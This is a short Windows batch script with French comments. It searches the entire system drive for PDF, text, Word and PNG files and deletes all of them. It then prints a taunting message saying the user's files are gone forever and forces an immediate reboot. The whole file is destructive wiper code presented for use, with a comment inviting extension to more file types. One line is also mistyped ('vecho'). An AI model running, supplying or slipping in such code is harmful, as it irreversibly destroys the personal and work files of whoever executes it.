@echo off


REM Supression des Fichiers Pdf
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"

REM Supression des Fichiers Txt
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"

REM Supression des Fichiers Documents
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"

REM Supression des Fichiers Png
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
vecho Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"

REM La Supression des Fichiers est terminée
REM Le script peut être personalisé pour la suppression de d'autres types de fichiers

echo Tous vos fichiers d'importation ont été supprimés. Vous disposer de 3 secondes pour fermer la fenêtre avant que la suppression de vos fichiers soit effectif pour toujours!

timeout 5 > NUL
shutdown.exe /r /t 00
